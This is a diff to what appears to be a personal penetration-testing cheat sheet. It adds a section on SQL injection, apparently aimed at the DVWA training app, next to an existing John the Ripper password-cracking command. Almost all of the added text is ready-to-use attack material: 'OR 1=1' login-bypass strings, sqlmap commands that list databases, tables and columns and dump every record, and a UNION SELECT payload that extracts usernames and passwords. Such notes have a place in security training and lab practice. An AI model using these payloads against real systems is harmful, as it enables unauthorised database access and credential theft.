@@ -2215,3 +2215,22 @@ Content-Type: application/x-php`
 - `john fileJohn.txt -w=/usr/share/wordlists/rockyou.txt`
 
 
+## <span style="color: #3498db; font-size: 0.8em;"> sql injection  </span>
+
+>sql injection basics
+
+- `'OR 1=1 # `
+- `'OR 1=1 --  `
+
+> sqlmap with burnsuite query  save to req.txt
+
+- `sqlmap -r req.txt --dbs`
+- `sqlmap -r req.txt -D NameDataBase --tables`
+- `sqlmap -r req.txt -D dvwa -T tableName --columns`
+- `sqlmap -r req.txt -D dvwa -T tableName --dump-all`
+
+> medium selectpicker
+- `value="1 OR 1=1 #”`
+
+> High
+- `1' UNION SELECT user, password FROM users#`
